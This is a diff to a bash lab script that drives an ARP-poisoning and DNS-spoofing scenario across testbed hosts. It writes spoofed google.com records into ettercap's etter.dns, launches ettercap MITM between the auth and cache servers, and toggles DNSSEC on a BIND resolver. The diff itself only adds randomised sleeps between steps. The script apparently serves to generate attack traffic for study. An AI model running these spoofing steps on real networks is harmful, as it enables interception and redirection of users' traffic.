@@ -4,6 +4,7 @@ remote_kill() {
     node=$1
     prog=$2
     ssh $node "sudo kill \$(ps -e | grep $prog | awk '{print \$1}')"
+    sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 }
 
 get_mac_ip() {
@@ -12,11 +13,15 @@ get_mac_ip() {
     ip=""
 
     res=$(ssh "$client" "ip --br addr | grep '10.1.2'")
+    sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
     interface=$(echo $res | awk '{print $1}')
+    sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
     ip=$(echo $res | awk '{print $3}')
+    sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
     mac=$(ssh "$client" "ip link show | grep -A 1 $interface | tail -1 | awk '{print \$2}'")
+    sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
     echo "$mac $ip"
 }
@@ -25,35 +30,51 @@ get_mac_ip() {
 
 ssh client "sudo apt install -y dnsutils traceroute"
 
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
+
+
 
 # Get MAC and IP from cache
 res=$(get_mac_ip cache)
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 cache_mac=$(echo $res | awk '{print $1}')
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 cache_ip_mask=$(echo $res | awk '{print $2}')
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 cache_ip=${cache_ip_mask::-3}
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 
 # Get MAC and IP from auth
 res=$(get_mac_ip auth)
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 auth_mac=$(echo $res | awk '{print $1}')
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 auth_ip_mask=$(echo $res | awk '{print $2}')
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 auth_ip=${auth_ip_mask::-3}
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 
 # Set up dns spoof file
 ssh attacker "sudo /bin/bash -c 'echo *.google.com   A 10.1.2.4 >> /etc/ettercap/etter.dns'"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh attacker "sudo /bin/bash -c 'echo google.com     A 10.1.2.4 >> /etc/ettercap/etter.dns'"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh attacker "sudo /bin/bash -c 'echo www.google.com A 10.1.2.4 >> /etc/ettercap/etter.dns'"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 
 # Set up MITM for arp poisoning and dns spoofing
 echo ssh attacker "sudo ettercap -T -S -i eth1 -M arp:remote -P dns_spoof /$auth_ip// /$cache_ip//"
 ssh attacker "sudo ettercap -T -S -i eth1 -M arp:remote -P dns_spoof /$auth_ip// /$cache_ip//" >> /dev/null &
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 etter_pid=$!
 
 sleep 5
 
 
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 cat<<EOF > /tmp/named.conf.options-with-dnssec
 options {
         directory "/var/cache/bind";
@@ -65,10 +86,14 @@ options {
         listen-on-v6 { any; };
 };
 EOF
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 scp /tmp/named.conf.options-with-dnssec cache:/tmp/named.conf.options-with-dnssec
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh cache "sudo cp /tmp/named.conf.options-with-dnssec /etc/bind/named.conf.options-with-dnssec"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 cat<<EOF > /tmp/named.conf.options-no-dnssec
 options {
         directory "/var/cache/bind";
@@ -81,38 +106,50 @@ options {
         dnssec-validation no;
 };
 EOF
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 scp /tmp/named.conf.options-no-dnssec cache:/tmp/named.conf.options-no-dnssec
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh cache "sudo cp /tmp/named.conf.options-no-dnssec /etc/bind/named.conf.options-no-dnssec"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 
 # Set up cache to not use dnssec by default
 ssh cache "sudo cp /etc/bind/named.conf.options-no-dnssec /etc/bind/named.conf.options"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh cache "sudo systemctl restart named"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 
 # Make a few queries
 for el in one two three; do
     ssh client "dig google.com"
+    sleep $(awk -v min=0.5 -v max=3 'BEGIN{srand(); print min+rand()*(max-min)}')
 done 
 
 
 # Set up cache to use dnssec by default
 # This doesn't work, but its fine. Now its only an arp & dns spoofing example
 ssh cache "sudo cp /etc/bind/named.conf.options-with-dnssec /etc/bind/named.conf.options"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh cache "sudo systemctl restart named"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 sleep 10
 
 # Make a few queries
 for el in one two three; do
     ssh client "dig google.com"
+    sleep $(awk -v min=0.5 -v max=3 'BEGIN{srand(); print min+rand()*(max-min)}')
 done 
 
 
 sudo kill $etter_pid
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 remote_kill attacker "ettercap"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 ssh cache "sudo systemctl stop named"
+sleep $(awk -v min=1.5 -v max=5 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 sleep 15
 
